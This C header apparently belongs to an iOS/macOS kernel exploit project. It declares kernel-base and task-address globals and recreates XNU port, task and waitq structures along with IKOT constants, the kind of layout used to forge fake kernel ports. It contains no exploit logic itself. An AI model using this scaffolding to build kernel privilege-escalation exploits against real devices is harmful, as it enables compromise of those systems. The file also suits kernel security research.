#ifndef expoit_h
#define expoit_h

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/mman.h>

#include "offsets.h"
#include "utilities.h"
#include "memory.h"

int start_time_saved(void);
extern uint64_t kernel_base;
extern uint64_t our_task_addr;
extern uint64_t self_struct_task;
extern uint64_t kern_struct_task;

#define IO_BITS_ACTIVE          0x80000000
#define IOT_PORT                0
#define IKOT_NONE               0
#define IKOT_TASK               2
#define IKOT_HOST_PRIV          4
#define IKOT_CLOCK              25
#define IKOT_IOKIT_CONNECT      29

#define WQT_QUEUE               0x2
#define _EVENT_MASK_BITS        ((sizeof(uint32_t) * 8) - 7)

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef struct {
    struct {
        uint64_t data;
        uint32_t reserved : 24,
        type     :  8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
} ktask_t;

union waitq_flags {
    struct {
        uint32_t /* flags */
    waitq_type:2,    /* only public field */
    waitq_fifo:1,    /* fifo wakeup policy? */
    waitq_prepost:1, /* waitq supports prepost? */
    waitq_irq:1,     /* waitq requires interrupts disabled */
    waitq_isvalid:1, /* waitq structure is valid */
    waitq_turnstile_or_port:1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
    waitq_eventmask:_EVENT_MASK_BITS;
    };
    uint32_t flags;
};

#endif /* exploit_h */
